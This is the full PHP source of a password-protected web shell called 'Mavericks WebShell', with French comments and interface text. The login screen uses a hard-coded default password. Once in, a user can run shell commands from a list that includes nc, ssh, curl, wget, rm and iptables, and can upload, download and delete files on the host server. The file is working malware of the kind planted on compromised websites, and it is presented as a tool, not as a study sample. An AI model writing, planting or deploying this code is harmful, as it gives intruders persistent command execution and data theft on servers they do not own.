<?php
session_start();
date_default_timezone_set('UTC');
define('AUTH_PASSWORD', 'changeme123'); // change le mot de passe

// Vérification d'authentification
if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === AUTH_PASSWORD) {
            $_SESSION['auth'] = true;
            header('Location: '.$_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Mot de passe incorrect.";
        }
    }
    echo '<!DOCTYPE html><html><head><title>Login - Mavericks</title>
    <style>
    body { background: black; color: #33ff33; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    form { background: #111; padding: 30px; border: 1px solid #33ff33; width: 300px; }
    input[type=password], input[type=submit] {
        background: black; color: #33ff33; border: 1px solid #33ff33;
        padding: 10px; width: 100%; margin-top: 10px;
    }
    </style></head><body>
    <form method="POST">
        <h2> Mavericks Webshell</h2>
        <input type="password" name="password" placeholder="Mot de passe" required>
        <input type="submit" value="Entrer">
        '.(isset($error) ? "<p style=\"color:red;\">$error</p>" : "").'
    </form></body></html>';
    exit;
}

// Liste blanche de commandes
$allowed_cmds = ['ls','id','pwd','whoami','cat','echo','df','top','ps','uptime','netstat','ifconfig','ip','who','last','chmod','chown','ping','curl','wget','find','grep','tar','zip','unzip','rmdir','rm','mkdir','cp','mv','uname','nc','telnet','ssh','history','lsblk','mount','umount','iptables','fuser','basename'];

function is_valid_command($cmd) {
    global $allowed_cmds;
    $parts = explode(" ", trim($cmd));
    $base_cmd = strtok($parts[0], ';|&'); // Empêche les commandes multiples
    return in_array($base_cmd, $allowed_cmds);
}

if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = [];
}

$output = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    if (is_valid_command($cmd)) {
        $exec = shell_exec(escapeshellcmd($cmd) . " 2>&1");
        $output = htmlspecialchars($exec ?: "Aucune sortie.");
        array_push($_SESSION['history'], ['time' => date("H:i:s"), 'cmd' => htmlspecialchars($cmd), 'output' => $output]);
        // Limiter l'historique à 50 entrées
        if (count($_SESSION['history']) > 50) {
            array_shift($_SESSION['history']);
        }
    } else {
        $output = "Commande non autorisée.";
    }
}

// Téléchargement
if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "Fichier introuvable."; exit;
    }
}

// Suppression de fichier
if (isset($_POST['delete_file']) && !empty($_POST['delete_file'])) {
    $file = basename($_POST['delete_file']);
    if (file_exists($file) && is_writable($file)) {
        if (unlink($file)) {
            $output = "Fichier '$file' supprimé.";
        } else {
            $output = "Erreur lors de la suppression du fichier '$file'.";
        }
    } else {
        $output = "Fichier '$file' non trouvé ou non accessible.";
    }
}

// Upload de fichier
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $target = basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $output = "Fichier uploadé : $target";
    } else {
        $output = "Upload échoué. Vérifiez les permissions.";
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mavericks WebShell</title>
<style>
body {
    background: black;
    color: #33ff33;
    font-family: monospace;
    padding: 20px;
    margin: 0;
}
h1 { text-shadow: 0 0 5px #33ff33; }
input, button {
    background: black;
    color: #33ff33;
    border: 1px solid #33ff33;
    padding: 8px;
    margin: 5px;
}
pre {
    background: #111;
    border: 1px solid #33ff33;
    padding: 10px;
    overflow-x: auto;
    white-space: pre-wrap;
}
.autocomplete-items {
    position: absolute;
    background-color: #111;
    border: 1px solid #33ff33;
    z-index: 99;
    max-height: 200px;
    overflow-y: auto;
}
.autocomplete-items div {
    padding: 10px;
    cursor: pointer;
    color: #33ff33;
}
.autocomplete-active {
    background-color: #33ff33;
    color: black;
}
ul {
    list-style-type: none;
    padding: 0;
}
li {
    padding: 5px 0;
}
</style>
</head>
<body>
<h1>Mavericks WebShell</h1>

<!-- Terminal de commande -->
<form method="POST" autocomplete="off">
    <input type="text" name="cmd" id="cmdInput" placeholder="Commande shell..." required>
    <input type="submit" value="Exécuter">
</form>

<!-- Upload -->
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload_file">
    <input type="submit" value="Uploader">
</form>

<!-- Suppression -->
<form method="POST">
    <input type="text" name="delete_file" placeholder="Nom du fichier à supprimer">
    <input type="submit" value="Supprimer">
</form>

<!-- Résultat -->
<?php if (!empty($output)): ?>
    <h3>Résultat :</h3>
    <pre><?= $output ?></pre>
<?php endif; ?>

<!-- Liste fichiers -->
<h3>📂 Fichiers locaux :</h3>
<ul>
<?php
foreach (scandir(".") as $f):
    if ($f === "." || $f === "..") continue;
    $filetype = is_dir($f) ? "📁" : "📄";
?>
    <li><?= $filetype ?> <?= htmlspecialchars($f) ?> —
        <?php if (!is_dir($f)): ?>
            <a href="?download=<?= urlencode($f) ?>">📥 Télécharger</a>
        <?php endif; ?>
    </li>
<?php endforeach; ?>
</ul>

<!-- Historique -->
<h3>🕘 Historique :</h3>
<?php foreach (array_reverse($_SESSION['history']) as $entry): ?>
    <div><strong>[<?= $entry['time'] ?>] $ <?= $entry['cmd'] ?></strong></div>
    <pre><?= $entry['output'] ?></pre>
<?php endforeach; ?>

<!-- Autocomplétion -->
<script>
const allowed = <?= json_encode($allowed_cmds) ?>;
const input = document.getElementById("cmdInput");
let currentFocus = -1;

input.addEventListener("input", function() {
    closeAllLists();
    if (!this.value) return false;
    const list = document.createElement("div");
    list.setAttribute("class", "autocomplete-items");
    this.parentNode.appendChild(list);
    allowed.forEach(cmd => {
        if (cmd.toLowerCase().startsWith(this.value.toLowerCase())) {
            const item = document.createElement("div");
            item.innerHTML = "<strong>" + cmd.substr(0, this.value.length) + "</strong>" + cmd.substr(this.value.length);
            item.innerHTML += "<input type='hidden' value='" + cmd + "'>";
            item.onclick = function() {
                input.value = this.getElementsByTagName("input")[0].value;
                closeAllLists();
            };
            list.appendChild(item);
        }
    });
});

input.addEventListener("keydown", function(e) {
    let items = document.querySelectorAll(".autocomplete-items div");
    if (e.key === "ArrowDown") { currentFocus++; setActive(items); }
    else if (e.key === "ArrowUp") { currentFocus--; setActive(items); }
    else if (e.key === "Enter" && currentFocus > -1) {
        e.preventDefault();
        if (currentFocus > -1 && items) items[currentFocus].click();
    }
});

function setActive(x) {
    if (!x) return;
    removeActive(x);
    if (currentFocus >= x.length) currentFocus = 0;
    if (currentFocus < 0) currentFocus = x.length - 1;
    x[currentFocus].classList.add("autocomplete-active");
}
function removeActive(x) {
    for (let i = 0; i < x.length; i++) x[i].classList.remove("autocomplete-active");
}
function closeAllLists(elmnt) {
    const items = document.getElementsByClassName("autocomplete-items");
    for (let i = 0; i < items.length; i++) {
        if (elmnt != items[i] && elmnt != input) items[i].parentNode.removeChild(items[i]);
    }
}
document.addEventListener("click", function (e) { closeAllLists(e.target); });
</script>
</body>
</html>
